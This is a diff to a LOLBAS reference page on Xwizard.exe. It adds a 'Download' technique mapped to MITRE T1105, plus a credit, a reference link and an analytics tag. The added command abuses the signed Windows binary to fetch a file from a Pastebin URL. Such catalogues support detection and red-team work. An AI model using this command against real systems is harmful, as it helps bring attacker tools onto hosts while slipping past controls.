@@ -34,6 +34,9 @@
 	
 	<li><a href="/lolbas/Binaries/Xwizard/#execute">Execute</a></li>
 	
+	
+	<li><a href="/lolbas/Binaries/Xwizard/#download">Download</a></li>
+	
 </ul>
 
 	
@@ -41,6 +44,14 @@
 
 
 
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133649096-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-133649096-1');
+</script>
 
 <br>
 <p><b>Paths:</b> 
@@ -67,6 +78,9 @@
 	
 	<a href="https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/">https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/</a>
 	<br>
+	
+	<a href="https://twitter.com/notwhickey/status/1306023056847110144">https://twitter.com/notwhickey/status/1306023056847110144</a>
+	<br>
 	 
 <br>
 <p><b>Acknowledgement:</b> 
@@ -79,6 +93,9 @@
 	<br>
 	
 	harr0ey - <a href="https://twitter.com/@harr0ey">@harr0ey</a>
+	<br>
+	
+	Wade Hickey - <a href="https://twitter.com/@notwhickey">@notwhickey</a>
 	<br>
 	 
 </p>
@@ -123,6 +140,25 @@
 		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 		<br>
 		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.
+		<br>
+		<pre><code>xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM</code></pre>
+		Usecase:Download file from Internet
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
 		<br>
 		<br>
 		<br>
